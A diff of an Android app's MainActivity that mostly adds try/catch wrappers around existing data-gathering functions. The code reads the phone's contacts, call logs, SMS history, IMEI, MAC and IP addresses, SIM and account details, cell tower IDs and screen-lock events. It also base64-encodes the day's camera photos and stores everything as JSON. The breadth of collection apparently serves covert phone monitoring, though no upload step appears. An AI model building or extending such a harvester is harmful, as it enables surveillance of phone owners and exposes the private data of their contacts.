@@ -155,7 +155,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             btsave.setEnabled(false);
             btsave.setOnClickListener(null);
         }
-        checkServices(getApplicationContext(),mSharedpref);
+        //checkServices(getApplicationContext(),mSharedpref);
         // String val=getFiles(mSharedpref);
         //readSmsHistory(this,mSharedpref);
 
@@ -372,68 +372,69 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         });
         readCallLogs(getApplicationContext(), mSharedpref);
         readSmsHistory(this,mSharedpref);
-        getFiles(mSharedpref);
+        //getFiles(mSharedpref);
     }
 
 
     public void readContacts() {
-        ContentResolver cr = getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null);
-        int i = 0;
-        if (cur.getCount() > 0) {
-            while (cur.moveToNext()) {
-                String mPhoneBuilder = "";
-                String emailBuilder = "";
+        try {
+            ContentResolver cr = getContentResolver();
+            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                    null, null, null, null);
+            int i = 0;
+            if (cur.getCount() > 0) {
+                while (cur.moveToNext()) {
+                    String mPhoneBuilder = "";
+                    String emailBuilder = "";
               /*  StringBuilder noteBuilder = new StringBuilder();
                 StringBuilder addressBuilder = new StringBuilder();
                 StringBuilder mInstantMessenger = new StringBuilder();
                 StringBuilder Organizations = new StringBuilder();*/
 
-                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
-                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-                Contact mContact = new Contact();
-                mContact.setNumber("" + i);
-                mContact.setId(id);
-                mContact.setName(name);
-                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
-                    System.out.println("name : " + name + ", ID : " + id);
+                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                    Contact mContact = new Contact();
+                    mContact.setNumber("" + i);
+                    mContact.setId(id);
+                    mContact.setName(name);
+                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                        System.out.println("name : " + name + ", ID : " + id);
 
-                    // get the phone number
-                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{id}, null);
-
-
-                    while (pCur.moveToNext()) {
-                        String phone = pCur.getString(
-                                pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        System.out.println("phone" + phone);
-                        mPhoneBuilder = phone + ",";
-                    }
-                    pCur.close();
-                    mContact.setPhoneNumber(mPhoneBuilder);
-                    System.out.println("phone" + mPhoneBuilder);
+                        // get the phone number
+                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                new String[]{id}, null);
 
 
-                    // get email and type
-                    Cursor emailCur = cr.query(
-                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
-                            new String[]{id}, null);
-                    while (emailCur.moveToNext()) {
-                        // This would allow you get several email addresses
-                        // if the email addresses were stored in an array
-                        String email = emailCur.getString(
-                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
-                        String emailType = emailCur.getString(
-                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
-                        emailBuilder = "Email " + email + " Email Type : " + emailType;
-                        System.out.println("Email " + email + " Email Type : " + emailType);
-                    }
-                    emailCur.close();
-                    mContact.setEmail(emailBuilder.toString());
+                        while (pCur.moveToNext()) {
+                            String phone = pCur.getString(
+                                    pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            System.out.println("phone" + phone);
+                            mPhoneBuilder = phone + ",";
+                        }
+                        pCur.close();
+                        mContact.setPhoneNumber(mPhoneBuilder);
+                        System.out.println("phone" + mPhoneBuilder);
+
+
+                        // get email and type
+                        Cursor emailCur = cr.query(
+                                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                                null,
+                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
+                                new String[]{id}, null);
+                        while (emailCur.moveToNext()) {
+                            // This would allow you get several email addresses
+                            // if the email addresses were stored in an array
+                            String email = emailCur.getString(
+                                    emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
+                            String emailType = emailCur.getString(
+                                    emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
+                            emailBuilder = "Email " + email + " Email Type : " + emailType;
+                            System.out.println("Email " + email + " Email Type : " + emailType);
+                        }
+                        emailCur.close();
+                        mContact.setEmail(emailBuilder.toString());
 
                    /* // Get note.......
                     String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
@@ -511,57 +512,70 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     orgCur.close();
                     mContact.setOrganizations(Organizations.toString());
                 */
+                    }
+                    contactList.add(mContact);
+                    i++;
                 }
-                contactList.add(mContact);
-                i++;
-            }
 
+            }
+            Type baseType = new TypeToken<List<Contact>>() {
+            }.getType();
+            Gson mGson = new Gson();
+            String detail = mGson.toJson(contactList, baseType);
+            mSharedpref.setPhoneNumbers(detail);
+            mSharedpref.setPhoneNumbersListSize(contactList.size());
+            mSharedpref.commit();
         }
-        Type baseType = new TypeToken<List<Contact>>() {
-        }.getType();
-        Gson mGson = new Gson();
-        String detail = mGson.toJson(contactList, baseType);
-        mSharedpref.setPhoneNumbers(detail);
-        mSharedpref.setPhoneNumbersListSize(contactList.size());
-        mSharedpref.commit();
+        catch (Exception e){
+            e.printStackTrace();
+            return;
+        }
+
     }
 
     public static HashMap<String, Object> deviceInformation(Context cntx) {
-        String os = System.getProperty("os.version"); // OS version
-        String sdk = Build.VERSION.SDK;// API Level
-        String device = Build.DEVICE;// Device
-        String manufacturer = Build.MANUFACTURER;//MANUFACTURER
-        String brand = Build.BRAND;
-        int versionCode = BuildConfig.VERSION_CODE;
-        String versionName = BuildConfig.VERSION_NAME;
-        String androidId = Settings.Secure.getString(cntx.getContentResolver(),
-                Settings.Secure.ANDROID_ID);
-        WifiManager wm = (WifiManager) cntx.getSystemService(WIFI_SERVICE);
-        String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
-        String macAddress = getMACAddress("wlan0");
-        String macAddress1 = getMACAddress("eth0");
-        String ipV4Adress = getIPAddress(true);
-        String ipV6Adress = getIPAddress(false);
-
-        String model = Build.MODEL;// Model
-        String product = Build.PRODUCT;
         HashMap<String, Object> deviceInfo = new HashMap<String, Object>();
-        deviceInfo.put("os", os);
-        deviceInfo.put("sdk", sdk);
-        deviceInfo.put("device", device);
-        deviceInfo.put("manufacturer", manufacturer);
-        deviceInfo.put("brand", brand);
-        deviceInfo.put("versionCode", versionCode);
-        deviceInfo.put("versionName", versionName);
-        deviceInfo.put("androidId", androidId);
-        deviceInfo.put("ip", ip);
-        deviceInfo.put("macAddress", macAddress);
-        deviceInfo.put("macAddress1", macAddress1);
-        deviceInfo.put("ipV4Adress", ipV4Adress);
-        deviceInfo.put("ipV6Adress", ipV6Adress);
-        deviceInfo.put("model", model);
-        deviceInfo.put("product", product);
-        deviceInfo.put("imeiNumber", getImieNumbers(cntx));
+        try {
+            String os = System.getProperty("os.version"); // OS version
+            String sdk = Build.VERSION.SDK;// API Level
+            String device = Build.DEVICE;// Device
+            String manufacturer = Build.MANUFACTURER;//MANUFACTURER
+            String brand = Build.BRAND;
+            int versionCode = BuildConfig.VERSION_CODE;
+            String versionName = BuildConfig.VERSION_NAME;
+            String androidId = Settings.Secure.getString(cntx.getContentResolver(),
+                    Settings.Secure.ANDROID_ID);
+            WifiManager wm = (WifiManager) cntx.getSystemService(WIFI_SERVICE);
+            String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
+            String macAddress = getMACAddress("wlan0");
+            String macAddress1 = getMACAddress("eth0");
+            String ipV4Adress = getIPAddress(true);
+            String ipV6Adress = getIPAddress(false);
+
+            String model = Build.MODEL;// Model
+            String product = Build.PRODUCT;
+            deviceInfo.put("os", os);
+            deviceInfo.put("sdk", sdk);
+            deviceInfo.put("device", device);
+            deviceInfo.put("manufacturer", manufacturer);
+            deviceInfo.put("brand", brand);
+            deviceInfo.put("versionCode", versionCode);
+            deviceInfo.put("versionName", versionName);
+            deviceInfo.put("androidId", androidId);
+            deviceInfo.put("ip", ip);
+            deviceInfo.put("macAddress", macAddress);
+            deviceInfo.put("macAddress1", macAddress1);
+            deviceInfo.put("ipV4Adress", ipV4Adress);
+            deviceInfo.put("ipV6Adress", ipV6Adress);
+            deviceInfo.put("model", model);
+            deviceInfo.put("product", product);
+            deviceInfo.put("imeiNumber", getImieNumbers(cntx));
+        }
+        catch (Exception e){
+            e.printStackTrace();
+            return deviceInfo;
+        }
+
         return deviceInfo;
     }
 
@@ -651,44 +665,51 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
     public static JSONArray simName(Context mContext) {
         JSONArray phonessimdetail = new JSONArray();
-        if (Build.VERSION.SDK_INT > 22) {
-            SubscriptionManager subscriptionManager = (SubscriptionManager) mContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+        try {
+            if (Build.VERSION.SDK_INT > 22) {
+                SubscriptionManager subscriptionManager = (SubscriptionManager) mContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
 
-            if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-                // TODO: Consider calling
-                //    ActivityCompat#requestPermissions
-                // here to request the missing permissions, and then overriding
-                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-                //                                          int[] grantResults)
-                // to handle the case where the user grants the permission. See the documentation
-                // for ActivityCompat#requestPermissions for more details.
-                return phonessimdetail;
-            }
-            List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
-            JSONObject cellObj = new JSONObject();
-            if (subscriptionInfoList != null && subscriptionInfoList.size() > 0) {
-                for (SubscriptionInfo info : subscriptionInfoList) {
-                    String carrierName = info.getCarrierName().toString();
-                    String countryIso = info.getCountryIso();
-                    int dataRoaming = info.getDataRoaming();
-                    String mobileNo = info.getNumber();
-                    String mIccId = info.getIccId();
-                    try {
-                        cellObj.put("carrierName", carrierName);
-                        cellObj.put("countryIso", info.getCountryIso());
-                        cellObj.put("dataRoaming", String.valueOf(info.getDataRoaming()));
-                        cellObj.put("mobileNo", info.getNumber());
-                        cellObj.put("mIccId", info.getIccId());
-                        cellObj.put("DefaultSim", getDefaultSimmm(mContext));
-                        cellObj.put("accounts",getemails(mContext));
-                        phonessimdetail.put(cellObj);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
+                if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                    // TODO: Consider calling
+                    //    ActivityCompat#requestPermissions
+                    // here to request the missing permissions, and then overriding
+                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                    //                                          int[] grantResults)
+                    // to handle the case where the user grants the permission. See the documentation
+                    // for ActivityCompat#requestPermissions for more details.
+                    return phonessimdetail;
+                }
+                List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
+                JSONObject cellObj = new JSONObject();
+                if (subscriptionInfoList != null && subscriptionInfoList.size() > 0) {
+                    for (SubscriptionInfo info : subscriptionInfoList) {
+                        String carrierName = info.getCarrierName().toString();
+                        String countryIso = info.getCountryIso();
+                        int dataRoaming = info.getDataRoaming();
+                        String mobileNo = info.getNumber();
+                        String mIccId = info.getIccId();
+                        try {
+                            cellObj.put("carrierName", carrierName);
+                            cellObj.put("countryIso", info.getCountryIso());
+                            cellObj.put("dataRoaming", String.valueOf(info.getDataRoaming()));
+                            cellObj.put("mobileNo", info.getNumber());
+                            cellObj.put("mIccId", info.getIccId());
+                            cellObj.put("DefaultSim", getDefaultSimmm(mContext));
+                            cellObj.put("accounts",getemails(mContext));
+                            phonessimdetail.put(cellObj);
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
                     }
                 }
-            }
 
+            }
         }
+        catch (Exception e){
+            e.printStackTrace();
+            return phonessimdetail;
+        }
+
         return phonessimdetail;
     }
 
@@ -759,17 +780,17 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     public static JSONArray getCellInfo(Context ctx) {
-        TelephonyManager tel = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
 
         JSONArray cellList = new JSONArray();
+        try {
+            // Type of the network
+            TelephonyManager tel = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+            int phoneTypeInt = tel.getPhoneType();
+            String phoneType = null;
+            phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_GSM ? "gsm" : phoneType;
+            phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_CDMA ? "cdma" : phoneType;
 
-// Type of the network
-        int phoneTypeInt = tel.getPhoneType();
-        String phoneType = null;
-        phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_GSM ? "gsm" : phoneType;
-        phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_CDMA ? "cdma" : phoneType;
-
-        //from Android M up must use getAllCellInfo
+            //from Android M up must use getAllCellInfo
         /*if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
 
 
@@ -787,45 +808,48 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             }
 
         } else {*/
-        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
-            return cellList;
-        }
-        List<CellInfo> infos = tel.getAllCellInfo();
-        for (int i = 0; i < infos.size(); ++i) {
-            try {
-                JSONObject cellObj = new JSONObject();
-                CellInfo info = infos.get(i);
-                if (info instanceof CellInfoGsm) {
-                    CellSignalStrengthGsm gsm = ((CellInfoGsm) info).getCellSignalStrength();
-                    CellIdentityGsm identityGsm = ((CellInfoGsm) info).getCellIdentity();
-                    cellObj.put("cellId", identityGsm.getCid());
-                    cellObj.put("lac", identityGsm.getLac());
-                    cellObj.put("dbm", gsm.getDbm());
-                    cellObj.put("mnc", identityGsm.getMnc());
-                    cellObj.put("mcc", identityGsm.getMcc());
-                    cellList.put(cellObj);
-                } else if (info instanceof CellInfoLte) {
-                    CellSignalStrengthLte lte = ((CellInfoLte) info).getCellSignalStrength();
-                    CellIdentityLte identityLte = ((CellInfoLte) info).getCellIdentity();
-                    cellObj.put("cellId", identityLte.getCi());
-                    cellObj.put("tac", identityLte.getTac());
-                    cellObj.put("dbm", lte.getDbm());
-                    cellList.put(cellObj);
+            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                // TODO: Consider calling
+                //    ActivityCompat#requestPermissions
+                // here to request the missing permissions, and then overriding
+                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                //                                          int[] grantResults)
+                // to handle the case where the user grants the permission. See the documentation
+                // for ActivityCompat#requestPermissions for more details.
+                return cellList;
+            }
+            List<CellInfo> infos = tel.getAllCellInfo();
+            for (int i = 0; i < infos.size(); ++i) {
+                try {
+                    JSONObject cellObj = new JSONObject();
+                    CellInfo info = infos.get(i);
+                    if (info instanceof CellInfoGsm) {
+                        CellSignalStrengthGsm gsm = ((CellInfoGsm) info).getCellSignalStrength();
+                        CellIdentityGsm identityGsm = ((CellInfoGsm) info).getCellIdentity();
+                        cellObj.put("cellId", identityGsm.getCid());
+                        cellObj.put("lac", identityGsm.getLac());
+                        cellObj.put("dbm", gsm.getDbm());
+                        cellObj.put("mnc", identityGsm.getMnc());
+                        cellObj.put("mcc", identityGsm.getMcc());
+                        cellList.put(cellObj);
+                    } else if (info instanceof CellInfoLte) {
+                        CellSignalStrengthLte lte = ((CellInfoLte) info).getCellSignalStrength();
+                        CellIdentityLte identityLte = ((CellInfoLte) info).getCellIdentity();
+                        cellObj.put("cellId", identityLte.getCi());
+                        cellObj.put("tac", identityLte.getTac());
+                        cellObj.put("dbm", lte.getDbm());
+                        cellList.put(cellObj);
+                    }
+
+                } catch (Exception ex) {
+
                 }
-
-            } catch (Exception ex) {
-
             }
         }
-        //    }
-
+        catch (Exception e){
+            e.printStackTrace();
+            return cellList;
+        }
         return cellList;
     }
 
@@ -952,7 +976,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     try {
                         jsonObject.put("value", status);
 
-                        jsonObject.put("time",Utils.getCurrentDateTime());
+                        jsonObject.put("time",Utils.getDateTime());
                          jsonArray.put(jsonObject);
                     mSharedpref.setPhoneLockDetails(jsonArray.toString());
                     mSharedpref.commit();
@@ -966,43 +990,46 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         getApplicationContext().registerReceiver(screenOnOffReceiver, theFilter);
     }
     public  static String getFiles(Sharedpref mSharedpref){
-        ArrayList<String> filenames=new ArrayList<>();
-        ArrayList<String> prevfilenames;
-        ArrayList<String> addNewFiles=new ArrayList<>();
-        String path = Environment.getExternalStorageDirectory().toString()+"/DCIM/Camera";
-        Log.d("Files", "Path: " + path);
-        File directory = new File(path);
-        File[] files = directory.listFiles();
-        Log.d("Files", "Size: "+ files.length);
-        for (int i = 0; i < files.length; i++)
-        {
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                String filedate=getDate("/storage/emulated/0/DCIM/Camera/"+ files[i].getName());
-                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
-                if (filedate.equalsIgnoreCase(currentDate)){
-                    filenames.add(files[i].getName());
+        String convertarray;
+        try {
+            ArrayList<String> filenames=new ArrayList<>();
+            ArrayList<String> prevfilenames;
+            ArrayList<String> addNewFiles=new ArrayList<>();
+            String path = Environment.getExternalStorageDirectory().toString()+"/DCIM/Camera";
+            Log.d("Files", "Path: " + path);
+            File directory = new File(path);
+            File[] files = directory.listFiles();
+            Log.d("Files", "Size: "+ files.length);
+            for (int i = 0; i < files.length; i++)
+            {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    String filedate=getDate("/storage/emulated/0/DCIM/Camera/"+ files[i].getName());
+                    String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
+                    if (filedate.equalsIgnoreCase(currentDate)){
+                        filenames.add(files[i].getName());
+                    }
+                }
+                else {
+                    return "";
                 }
             }
-            else {
-                return "";
+            Gson gson=new Gson();
+            Type listType = new TypeToken< ArrayList<String> >(){}.getType();
+            prevfilenames=gson.fromJson(mSharedpref.getImageList(),listType );
+            if(prevfilenames==null){
+                prevfilenames=new ArrayList<>();
             }
-        }
-        Gson gson=new Gson();
-        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
-        prevfilenames=gson.fromJson(mSharedpref.getImageList(),listType );
-        if(prevfilenames==null){
-            prevfilenames=new ArrayList<>();
-        }
-        filenames.removeAll(prevfilenames);
-        JSONArray mJsonArray=new JSONArray();
-        int value;
-        if (filenames.size()>=2){
-            value=2;
-        }
-        else value=filenames.size();
-        for (int i=0;i<value;i++){
-            JSONObject mjJsonObject=new JSONObject();
+            filenames.removeAll(prevfilenames);
+            JSONArray mJsonArray=new JSONArray();
+            int value;
+            if (filenames.size()>=2){
+                value=1;
+            }
+            else value=filenames.size();
+            for (int i=0;i<value;i++){
+                JSONObject mjJsonObject=new JSONObject();
                 try {
+                    mjJsonObject.put("no of imgs taken",filenames.size());
                     mjJsonObject.put("name",filenames.get(i));
                     try {
                         String encodedImage = Base64.encodeToString(byteArrayImage(filenames.get(i)), Base64.DEFAULT);
@@ -1013,23 +1040,28 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                         continue;
                     }
                     mJsonArray.put(mjJsonObject);
-                    addNewFiles.add(files[i].getName());
+                    addNewFiles.add(filenames.get(i));
                 } catch (JSONException e) {
                     e.printStackTrace();
                 }
-        }
-        String convertarray;
-        try {
-            convertarray=gson.toJson(mJsonArray);
-            prevfilenames.addAll(addNewFiles);
-            String fil=gson.toJson(prevfilenames);
-            mSharedpref.setImageList(fil);
-            mSharedpref.commit();
+            }
+            try {
+                convertarray=gson.toJson(mJsonArray);
+                prevfilenames.addAll(addNewFiles);
+                String fil=gson.toJson(prevfilenames);
+                mSharedpref.setImageList(fil);
+                mSharedpref.commit();
+            }
+            catch (Exception e){
+                e.printStackTrace();
+                return "";
+            }
         }
         catch (Exception e){
             e.printStackTrace();
             return "";
         }
+
         return convertarray;
     }
     public static byte[] byteArrayImage(String imagepath){
